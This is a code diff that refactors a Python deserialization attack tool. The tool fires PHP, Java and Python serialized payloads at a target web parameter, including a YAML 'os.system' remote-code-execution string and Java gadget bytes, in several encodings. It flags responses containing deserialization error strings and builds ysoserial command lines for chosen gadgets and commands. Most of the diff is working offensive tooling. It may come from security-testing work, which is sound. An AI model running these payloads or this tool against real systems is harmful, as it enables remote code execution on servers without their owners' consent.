@@ -17,7 +17,7 @@ from typing import Dict, List, Any, Optional, Tuple
 from dataclasses import dataclass, field
 
 import requests
-from requests.exceptions import RequestException
+from requests.exceptions import RequestException, Timeout, ConnectionError
 
 
 @dataclass
@@ -57,6 +57,30 @@ class DeserializationAttacker:
         'yaml_rce': "!!python/object/apply:os.system ['id']",
     }
     
+    # Language-specific error indicators
+    LANGUAGE_INDICATORS = {
+        'php': [
+            'unserialize', 'deserialize', '__wakeup',
+            '__destruct', 'invalid serialization', 'serialize',
+            'php_error', 'warning: unserialize',
+        ],
+        'java': [
+            'java.io', 'classnotfound', 'serialization',
+            'objectinputstream', 'invalidclass', 'java.lang',
+            'exception in thread', 'java.util',
+        ],
+        'python': [
+            'pickle', 'unpickle', 'yaml.constructor',
+            'deserialize', 'unsafe', 'pickle.loads',
+            'yaml.load', 'python object',
+        ],
+        'dotnet': [
+            'system.runtime.serialization',
+            'binaryformatter', 'deserialize',
+            'invalidoperationexception',
+        ],
+    }
+    
     def __init__(
         self,
         target: str,
@@ -69,7 +93,7 @@ class DeserializationAttacker:
             target: Target URL
             config: Configuration dictionary
         """
-        self.target = target
+        self.target = target if target else ''
         self.config = config or {}
         self.session = requests.Session()
         self.session.headers.update({
@@ -79,9 +103,155 @@ class DeserializationAttacker:
         self.timeout = self.config.get('timeout', 30)
         self.verify_ssl = self.config.get('verify_ssl', False)
         self.callback_server = self.config.get('callback_server', '')
+        self.max_payloads_per_language = self.config.get('max_payloads_per_language', 5)
         
         self.results: List[DeserializationResult] = []
         self.errors: List[str] = []
+        self.scan_status: str = 'initialized'
+    
+    def _safe_base64_decode(self, data: str) -> Optional[bytes]:
+        """
+        Safely decode base64 string.
+        
+        Args:
+            data: Base64 encoded string
+            
+        Returns:
+            Decoded bytes or None
+        """
+        if not data:
+            return None
+        
+        try:
+            # Add padding if needed
+            padding = 4 - (len(data) % 4)
+            if padding != 4:
+                data += '=' * padding
+            return base64.b64decode(data)
+        except (binascii.Error, ValueError, TypeError) as e:
+            self.errors.append(f"Base64 decode failed: {str(e)}")
+            return None
+    
+    def _safe_hex_decode(self, data: str) -> Optional[bytes]:
+        """
+        Safely decode hex string.
+        
+        Args:
+            data: Hex encoded string
+            
+        Returns:
+            Decoded bytes or None
+        """
+        if not data:
+            return None
+        
+        try:
+            return binascii.unhexlify(data)
+        except (binascii.Error, ValueError, TypeError) as e:
+            self.errors.append(f"Hex decode failed: {str(e)}")
+            return None
+    
+    def _safe_post_request(
+        self,
+        url: str,
+        data: Any,
+        headers: Optional[Dict[str, str]] = None
+    ) -> Optional[requests.Response]:
+        """
+        Safely send POST request.
+        
+        Args:
+            url: Target URL
+            data: Request data
+            headers: Additional headers
+            
+        Returns:
+            Response or None
+        """
+        try:
+            req_headers = headers or {}
+            return self.session.post(
+                url,
+                data=data,
+                headers=req_headers,
+                timeout=self.timeout,
+                verify=self.verify_ssl
+            )
+        except (Timeout, ConnectionError) as e:
+            self.errors.append(f"Request timeout/connection error: {str(e)}")
+            return None
+        except RequestException as e:
+            self.errors.append(f"Request failed: {str(e)}")
+            return None
+    
+    def _validate_payload(self, payload: str) -> bool:
+        """
+        Validate payload before use.
+        
+        Args:
+            payload: Payload string
+            
+        Returns:
+            True if payload is valid
+        """
+        if not payload:
+            return False
+        
+        # Check for minimal length
+        if len(payload) < 3:
+            return False
+        
+        return True
+    
+    def _normalize_parameter(self, parameter: str) -> str:
+        """
+        Clean and normalize parameter name.
+        
+        Args:
+            parameter: Parameter name
+            
+        Returns:
+            Normalized parameter
+        """
+        return parameter.strip()
+    
+    def _check_response_for_indicators(
+        self,
+        response_text: str,
+        indicators: List[str]
+    ) -> bool:
+        """
+        Check response for language-specific indicators.
+        
+        Args:
+            response_text: HTTP response text
+            indicators: List of indicator strings
+            
+        Returns:
+            True if any indicator found
+        """
+        if not response_text:
+            return False
+        
+        response_lower = response_text.lower()
+        
+        for indicator in indicators:
+            if indicator.lower() in response_lower:
+                return True
+        
+        return False
+    
+    def _get_language_indicators(self, language: str) -> List[str]:
+        """
+        Get indicators for specific language.
+        
+        Args:
+            language: Language name
+            
+        Returns:
+            List of indicator strings
+        """
+        return self.LANGUAGE_INDICATORS.get(language, [])
     
     def test_php_deserialization(
         self,
@@ -99,47 +269,52 @@ class DeserializationAttacker:
             List of DeserializationResult objects
         """
         results = []
+        param_clean = self._normalize_parameter(parameter)
         
         for payload_name, payload in self.PHP_PAYLOADS.items():
+            if not self._validate_payload(payload):
+                continue
+            
             encoded_payloads = [
-                payload,
-                base64.b64encode(payload.encode()).decode(),
-                binascii.hexlify(payload.encode()).decode(),
+                ('plain', payload),
+                ('base64', base64.b64encode(payload.encode()).decode()),
             ]
             
-            for encoded in encoded_payloads:
+            # Add hex encoding if payload is small enough
+            if len(payload) < 500:
                 try:
-                    data = {parameter: encoded}
-                    response = self.session.post(
-                        url,
-                        data=data,
-                        timeout=self.timeout,
-                        verify=self.verify_ssl
-                    )
+                    hex_payload = binascii.hexlify(payload.encode()).decode()
+                    encoded_payloads.append(('hex', hex_payload))
+                except (binascii.Error, TypeError):
+                    pass
+            
+            for encoding_type, encoded in encoded_payloads:
+                try:
+                    data = {param_clean: encoded}
+                    response = self._safe_post_request(url, data=data)
                     
-                    response_text = response.text.lower()
-                    error_indicators = [
-                        'unserialize', 'deserialize', '__wakeup',
-                        '__destruct', 'invalid serialization',
-                    ]
+                    if response is None:
+                        continue
                     
-                    success = any(indicator in response_text for indicator in error_indicators)
+                    response_text = response.text if response.text else ''
+                    indicators = self._get_language_indicators('php')
+                    success = self._check_response_for_indicators(response_text, indicators)
                     
                     result = DeserializationResult(
                         url=url,
                         parameter=parameter,
                         language='PHP',
                         payload_type=payload_name,
-                        payload=payload[:200],
-                        encoded_payload=encoded[:200],
+                        payload=payload[:200] + ('...' if len(payload) > 200 else ''),
+                        encoded_payload=encoded[:200] + ('...' if len(encoded) > 200 else ''),
                         success=success,
                         command_output=None,
-                        description=f'PHP deserialization test with {payload_name} payload'
+                        description=f'PHP deserialization test with {payload_name} payload ({encoding_type})'
                     )
                     
                     results.append(result)
                     
-                except RequestException as e:
+                except Exception as e:
                     self.errors.append(f"PHP deserialization test failed: {str(e)}")
                     continue
         
@@ -162,34 +337,38 @@ class DeserializationAttacker:
             List of DeserializationResult objects
         """
         results = []
+        param_clean = self._normalize_parameter(parameter)
         
         for payload_name, payload in self.JAVA_PAYLOADS.items():
+            if not self._validate_payload(payload):
+                continue
+            
+            # Try base64 decode
+            raw_bytes = self._safe_base64_decode(payload)
+            
+            if raw_bytes is None:
+                self.errors.append(f"Failed to decode Java payload: {payload_name}")
+                continue
+            
             try:
-                raw_bytes = base64.b64decode(payload)
+                data = {param_clean: raw_bytes}
+                headers = {'Content-Type': 'application/octet-stream'}
+                response = self._safe_post_request(url, data=data, headers=headers)
                 
-                response = self.session.post(
-                    url,
-                    data=raw_bytes,
-                    headers={'Content-Type': 'application/octet-stream'},
-                    timeout=self.timeout,
-                    verify=self.verify_ssl
-                )
+                if response is None:
+                    continue
                 
-                response_text = response.text.lower()
-                error_indicators = [
-                    'java.io', 'classnotfound', 'serialization',
-                    'objectinputstream', 'invalidclass',
-                ]
-                
-                success = any(indicator in response_text for indicator in error_indicators)
+                response_text = response.text if response.text else ''
+                indicators = self._get_language_indicators('java')
+                success = self._check_response_for_indicators(response_text, indicators)
                 
                 result = DeserializationResult(
                     url=url,
                     parameter=parameter,
                     language='Java',
                     payload_type=payload_name,
-                    payload=payload[:200],
-                    encoded_payload=payload[:200],
+                    payload=payload[:200] + ('...' if len(payload) > 200 else ''),
+                    encoded_payload=payload[:200] + ('...' if len(payload) > 200 else ''),
                     success=success,
                     command_output=None,
                     description=f'Java deserialization test with {payload_name} payload'
@@ -197,7 +376,7 @@ class DeserializationAttacker:
                 
                 results.append(result)
                 
-            except (RequestException, binascii.Error) as e:
+            except Exception as e:
                 self.errors.append(f"Java deserialization test failed: {str(e)}")
                 continue
         
@@ -220,46 +399,44 @@ class DeserializationAttacker:
             List of DeserializationResult objects
         """
         results = []
+        param_clean = self._normalize_parameter(parameter)
         
         for payload_name, payload in self.PYTHON_PAYLOADS.items():
+            if not self._validate_payload(payload):
+                continue
+            
             encoded_payloads = [
-                payload,
-                base64.b64encode(payload.encode()).decode(),
+                ('plain', payload),
+                ('base64', base64.b64encode(payload.encode()).decode()),
             ]
             
-            for encoded in encoded_payloads:
+            for encoding_type, encoded in encoded_payloads:
                 try:
-                    data = {parameter: encoded}
-                    response = self.session.post(
-                        url,
-                        data=data,
-                        timeout=self.timeout,
-                        verify=self.verify_ssl
-                    )
+                    data = {param_clean: encoded}
+                    response = self._safe_post_request(url, data=data)
                     
-                    response_text = response.text.lower()
-                    error_indicators = [
-                        'pickle', 'unpickle', 'yaml.constructor',
-                        'deserialize', 'unsafe',
-                    ]
+                    if response is None:
+                        continue
                     
-                    success = any(indicator in response_text for indicator in error_indicators)
+                    response_text = response.text if response.text else ''
+                    indicators = self._get_language_indicators('python')
+                    success = self._check_response_for_indicators(response_text, indicators)
                     
                     result = DeserializationResult(
                         url=url,
                         parameter=parameter,
                         language='Python',
                         payload_type=payload_name,
-                        payload=payload[:200],
-                        encoded_payload=encoded[:200],
+                        payload=payload[:200] + ('...' if len(payload) > 200 else ''),
+                        encoded_payload=encoded[:200] + ('...' if len(encoded) > 200 else ''),
                         success=success,
                         command_output=None,
-                        description=f'Python deserialization test with {payload_name} payload'
+                        description=f'Python deserialization test with {payload_name} payload ({encoding_type})'
                     )
                     
                     results.append(result)
                     
-                except RequestException as e:
+                except Exception as e:
                     self.errors.append(f"Python deserialization test failed: {str(e)}")
                     continue
         
@@ -289,10 +466,30 @@ class DeserializationAttacker:
             'Spring1', 'Spring2', 'Groovy1',
         ]
         
-        if gadget in gadgets:
-            return f"java -jar ysoserial.jar {gadget} '{command}' | base64"
+        if gadget not in gadgets:
+            return None
         
-        return None
+        return f"java -jar ysoserial.jar {gadget} '{command}' | base64"
+    
+    def test_connection(self) -> bool:
+        """
+        Test if target is reachable.
+        
+        Returns:
+            True if target is reachable
+        """
+        if not self.target:
+            return False
+        
+        try:
+            response = self.session.get(
+                self.target,
+                timeout=5,
+                verify=self.verify_ssl
+            )
+            return response.status_code < 500
+        except Exception:
+            return False
     
     def run(
         self,
@@ -311,14 +508,55 @@ class DeserializationAttacker:
         Returns:
             Dictionary with attack results
         """
-        if language in ['auto', 'php']:
-            self.test_php_deserialization(url, parameter)
+        # Reset state
+        self.results.clear()
+        self.errors.clear()
+        self.scan_status = 'running'
         
-        if language in ['auto', 'java']:
-            self.test_java_deserialization(url, parameter)
+        # Validate inputs
+        if not url:
+            self.errors.append("URL is empty")
+            self.scan_status = 'failed'
+            return {
+                'findings': [],
+                'errors': self.errors,
+                'language_tested': language,
+                'total_tests': 0,
+                'vulnerabilities_found': 0,
+                'scan_status': 'failed',
+            }
         
-        if language in ['auto', 'python']:
-            self.test_python_deserialization(url, parameter)
+        if not parameter:
+            self.errors.append("Parameter is empty")
+            self.scan_status = 'failed'
+            return {
+                'findings': [],
+                'errors': self.errors,
+                'language_tested': language,
+                'total_tests': 0,
+                'vulnerabilities_found': 0,
+                'scan_status': 'failed',
+            }
+        
+        # Test target languages
+        languages_to_test = []
+        
+        if language == 'auto':
+            languages_to_test = ['php', 'java', 'python']
+        else:
+            languages_to_test = [language]
+        
+        for lang in languages_to_test:
+            if lang == 'php':
+                self.test_php_deserialization(url, parameter)
+            elif lang == 'java':
+                self.test_java_deserialization(url, parameter)
+            elif lang == 'python':
+                self.test_python_deserialization(url, parameter)
+            else:
+                self.errors.append(f"Unsupported language: {lang}")
+        
+        self.scan_status = 'completed'
         
         findings = []
         for result in self.results:
@@ -336,6 +574,8 @@ class DeserializationAttacker:
             'findings': findings,
             'errors': self.errors,
             'language_tested': language,
+            'languages_actual': languages_to_test,
             'total_tests': len(self.results),
             'vulnerabilities_found': len(findings),
+            'scan_status': self.scan_status,
         }
